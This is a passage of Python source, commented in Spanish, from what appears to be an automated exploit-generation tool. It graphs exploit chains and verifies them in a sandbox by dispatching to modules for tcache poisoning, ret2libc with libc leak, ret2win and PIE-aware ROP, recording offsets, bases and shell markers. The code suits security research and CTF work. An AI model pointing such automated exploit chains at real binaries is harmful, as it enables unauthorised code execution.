    def node(nid, label, kind, detail="", regs=None, stack="", constraints="", verified=False):
        if nid not in ids:
            ids[nid] = True
            nodes.append({"id": nid, "label": label, "kind": kind, "detail": detail,
                          "regs": regs or {}, "stack": stack, "constraints": constraints,
                          "verified": verified})
        return nid

    es = getattr(an, "lang", "es") == "es"
    node("vuln", "Vulnerabilidad" if es else "Vulnerability", "vuln",
         "Desbordamiento de pila / control de retorno" if es else "Stack overflow / return control")
    for ci, c in enumerate(an.chains):
        prev = "vuln"
        for si, st in enumerate(c.steps):
            if st.kind == "vuln":
                continue
            nid = f"c{ci}s{si}"
            lbl = st.label + ("" if st.kind != "gadget" or st.addr is None else f"\n{hex(st.addr)}")
            # el nodo objetivo de una cadena VERIFICADA se marca y lleva la prueba concreta
            tgt_verified = st.kind == "target" and c.verified
            detail = st.detail
            if tgt_verified and c.proof:
                pr = c.proof
                detail = (detail + (" | " if detail else "")
                          + f"VERIFICADO: {pr.get('strategy','')} offset={pr.get('offset')}"
                          + (f" base={pr.get('base')}" if pr.get('base') else "")
                          + (f" win={pr.get('win')}" if pr.get('win') else "")
                          + f" (marcador {pr.get('marker','')})")
            node(nid, lbl + ("  [OK]" if tgt_verified else ""), st.kind, detail,
                 st.regs, st.stack, st.constraints, verified=tgt_verified)
            # arista rota si el gadget/simbolo falta (marcado como AUSENTE/ABSENT en ambos idiomas)
            bad = ("AUSENTE" in (st.detail or "")) or ("ABSENT" in (st.detail or "")) \
                or ("ausente" in (st.constraints or "")) or ("absent" in (st.constraints or ""))
            edges.append({"src": prev, "dst": nid, "chain": ci, "ok": not bad})
            prev = nid
    return {"nodes": nodes, "edges": edges}


import re as _re_cv


def _proof_from_pie(detail: str) -> dict:
    """Extrae offset/base/strategy de la linea 'VERIFIED off=.. base=0x.. strategy=..' de autopie."""
    p = {}
    m = _re_cv.search(r"off=(\d+)", detail or "")
    if m: p["offset"] = int(m.group(1))
    m = _re_cv.search(r"base=(0x[0-9a-fA-F]+)", detail or "")
    if m: p["base"] = m.group(1)
    m = _re_cv.search(r"strategy=([\w\-]+)", detail or "")
    if m: p["strategy"] = m.group(1)
    return p


def _verify_chain(binary: str, kind: str, facts: dict, lang: str):
    """Verifica la cadena EJECUTANDOLA en el sandbox con el verificador adecuado segun el tipo y
    las protecciones (PIE-aware, con fallback a ret2libc-con-leak). Devuelve (texto, verified, proof).
    proof = {strategy, offset, base, win, marker, output}. Nunca lanza."""
    es = lang == "es"
    pie = facts.get("pie") is True
    OK = "VERIFICADA" if es else "VERIFIED"
    NO = "no verificada" if es else "not verified"
    try:
        if kind == "uaf_tcache":
            from .autoheap import autoheap_shell
            r = autoheap_shell(binary)
            v = bool(r.get("verified"))
            detail = r.get("detail", "") or ""
            proof = {"strategy": "tcache-poison free@GOT=win", "marker": "BINORACLE_PWNED",
                     "output": (r.get("output", "") or "")[-300:]}
            for key in ("key", "free_got", "win"):
                m = _re_cv.search(rf"{key}=(0x[0-9a-fA-F]+)", detail)
                if m:
                    proof[key] = m.group(1)
            return ((f"{OK} (tcache poisoning: free@GOT sobrescrito con win(), shell en sandbox)" if v
                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
        if kind == "ret2libc_leak":
            from .autolibc import autolibc
            r = autolibc(binary, run=True)
            v = bool(r.get("verified"))
            proof = {"strategy": "ret2libc+leak (2 etapas)", "marker": "BINORACLE_LIBC_PWNED",
                     "output": (r.get("output", "") or "")[-300:]}
            for key in ("off", "leak", "base", "system"):
                m = _re_cv.search(rf"{key}=(0x[0-9a-fA-F]+|\d+)", r.get("detail", "") or "")
                if m:
                    proof["offset" if key == "off" else key] = m.group(1)
            return ((f"{OK} (ret2libc con fuga de libc: base={proof.get('base')}, shell en sandbox)" if v
                     else f"{NO}: {r.get('note', '')}"), v, proof if v else {})
        if kind == "ret2win":
            if pie:
                from .autopie import autopie_ret2win
                r = autopie_ret2win(binary, run=True)
                v = bool(r.get("verified"))
                proof = _proof_from_pie(r.get("detail", ""))
                proof.update({"win": hex(facts["win"]) if facts.get("win") else None,
                              "marker": "BINORACLE_PWNED", "output": (r.get("output") or "")[-300:]})
                proof.setdefault("strategy", "ret2win-pie")
                return ((f"{OK} (ret2win PIE, base resuelta en sandbox)" if v
                         else f"{NO}: {r.get('note','')}"), v, proof if v else {})
            from .autopoc import autopoc
            r = autopoc(binary, run=True)
            v = bool(getattr(r, "verified", False))
            proof = {"strategy": "ret2win", "offset": getattr(r, "offset", None),
                     "win": hex(r.win) if getattr(r, "win", None) else None,
                     "marker": "BINORACLE_PWNED", "output": (getattr(r, "run_output", "") or "")[-300:]}
            return ((f"{OK} (shell en sandbox, offset={proof['offset']}, win={proof['win']})" if v
                     else (f"construida; {NO} en sandbox" if es else f"built; {NO} in sandbox")),
                    v, proof if v else {})
        else:  # ret2libc / execve
            if pie:
                from .autopie import autopie_rop
                r = autopie_rop(binary, run=True)
                v = bool(r.get("verified"))
                proof = _proof_from_pie(r.get("detail", ""))
                proof.update({"marker": "BINORACLE_PWNED", "output": (r.get("output") or "")[-300:]})
                proof.setdefault("strategy", "rop-pie")
                return ((f"{OK} (ROP PIE, base resuelta, offset={proof.get('offset')})" if v
                         else f"{NO}: {r.get('note','')}"), v, proof if v else {})
            from .autopoc import autorop
            r = autorop(binary, run=True)
            v = bool(r.get("verified"))
            if not v and facts.get("system") is None:   # binario dinamico sin system: prueba leak
                try:
                    from .autolibc import autolibc
                    rl = autolibc(binary, run=True)
                    if rl.get("verified"):
                        proof = {"strategy": "ret2libc+leak", "offset": rl.get("offset"),
                                 "marker": "BINORACLE_PWNED", "output": (rl.get("output") or "")[-300:]}
                        return f"{OK} (ret2libc con leak de libc, shell en sandbox)", True, proof
                except Exception:
                    pass
            proof = {"strategy": r.get("strategy", "rop"), "offset": r.get("offset"),
                     "marker": "BINORACLE_PWNED", "output": (r.get("run_output") or "")[-300:]}
            return ((f"{OK} ({proof['strategy']}, offset={proof['offset']})" if v
                     else (f"{NO}: " + (r.get('note', '') or ''))), v, proof if v else {})
    except Exception as e:
        return ((f"no simulada ({e.__class__.__name__})" if es
                 else f"not simulated ({e.__class__.__name__})"), False, {})
